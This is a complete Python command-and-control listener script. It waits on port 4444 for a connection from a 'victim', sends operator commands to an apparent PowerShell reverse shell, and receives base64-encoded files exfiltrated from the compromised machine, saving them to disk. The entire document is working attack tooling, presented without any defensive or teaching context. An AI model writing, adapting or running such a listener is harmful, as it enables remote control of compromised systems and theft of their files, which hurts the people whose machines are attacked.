#!/usr/bin/env python3
import socket
import base64
import sys

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    
    print("[*] Smart C2 Listener on port 4444")
    print("[*] Waiting for connection...")
    
    conn, addr = server.accept()
    print(f"[+] Connected from {addr[0]}:{addr[1]}")
    
    receiving_file = False
    file_b64 = ""
    file_count = 1
    
    while True:
        try:
            # Receive data from victim
            data = conn.recv(65536).decode('utf-8', errors='ignore')
            if not data:
                break
            
            # Check for file transfer
            if "FILE_START" in data:
                receiving_file = True
                file_b64 = ""
                
                # Parse file info
                lines = data.split('\n')
                for line in lines:
                    if line.startswith("FILE_START"):
                        parts = line.split('|')
                        filename = parts[1] if len(parts) > 1 else f"file_{file_count}"
                        print(f"\n[*] Receiving file: {filename}")
                        continue
                    elif line == "FILE_END":
                        receiving_file = False
                        # Decode and save
                        try:
                            file_data = base64.b64decode(file_b64)
                            output_filename = filename
                            with open(output_filename, 'wb') as f:
                                f.write(file_data)
                            print(f"[+] File saved as: {output_filename}")
                            file_count += 1
                        except Exception as e:
                            print(f"[-] Decode error: {e}")
                        file_b64 = ""
                        break
                    elif receiving_file:
                        file_b64 += line
            else:
                # Print normal command output
                print(data, end='')
            
            # Send prompt and get next command
            print("PS> ", end='', flush=True)
            cmd = input()
            conn.send((cmd + "\n").encode())
            
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    
    conn.close()
    server.close()
    print("[*] Connection closed")

if __name__ == "__main__":
    main()